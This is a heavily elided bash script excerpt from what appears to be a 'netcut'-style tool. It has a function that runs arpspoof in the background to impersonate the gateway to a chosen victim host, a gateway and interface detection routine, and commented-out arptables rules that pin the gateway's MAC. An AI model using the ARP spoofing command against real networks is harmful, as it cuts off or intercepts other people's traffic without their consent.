...
#diaa	run_as_root arptables -F
#diaa	run_as_root arptables -P INPUT DROP
#diaa	run_as_root arptables -P OUTPUT DROP
#diaa	run_as_root arptables -A INPUT -s "${gw-}" --source-mac "${a[2]}" -j ACCEPT
#diaa	run_as_root arptables -A OUTPUT -d "${gw-}" --destination-mac "${a[2]}" -j ACCEPT
}
...
function netcutvictim() {
	...
	run_as_root arpspoof -i "${iface-}" -t "${a[1]}" "$gw" &>/dev/null &
	local arpspoof_pid=$!
...
function default_gw() {
	...
	do
		...
		if [[ $line == *"default"* ]]; then
			...
			iface=$(echo "$line" | grep -E -o '(eth|wlan)[0-9]')
			myip=$(hostname -I)
		fi
	done < <(ip route list)
